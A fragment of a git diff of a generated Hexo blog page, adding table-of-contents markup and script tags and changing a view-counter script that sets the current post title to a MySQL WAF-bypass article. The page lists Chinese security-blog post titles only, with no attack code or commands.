class="nav-text">空白符:</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -889,6 +1056,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -1449,13 +1620,13 @@
       var articles = db.collection('articles')
 
       //https://hexo.io/zh-tw/docs/variables.html
-      var isPost = ''.length > 0
+      var isPost = 'bypasswaf for mysql [数据库层面之特殊字符篇]'.length > 0
       var isArchive = '' === 'true'
       var isCategory = ''.length > 0
       var isTag = ''.length > 0
 
       if (isPost) { //is article page
-        var title = ''
+        var title = 'bypasswaf for mysql [数据库层面之特殊字符篇]'
         var doc = articles.doc(title)
 
         getCount(doc, true).then(appendCountTo($('.post-meta')))
@@ -1463,7 +1634,7 @@
       else if (!isArchive && !isCategory && !isTag) { //is index page
         var titles = [] //array to titles
 
-        var postsstr = 'titles.push("不知道列名的情况下注入");titles.push("「木马变形」一句话木马的各种变形");titles.push("「前端钓鱼欺骗」前端黑魔法之远程控制地址栏");titles.push("Hashpump实现哈希长度扩展攻击");titles.push("PHP弱类型之md5_tips(ctf经常用到PHP弱类型)");titles.push("Mimikatz 使用Tips");titles.push("Windows命令执行漏洞技巧");titles.push("LFI_SSH日志");titles.push("WAF是如何被绕过的？SQL注入常见手法解密。");titles.push("Linux通配符绕过文件名黑名单");' //if you have a better way to get titles of posts, please change it
+        var postsstr = '' //if you have a better way to get titles of posts, please change it
         eval(postsstr)
 
         var promises = titles.map(function (title) {
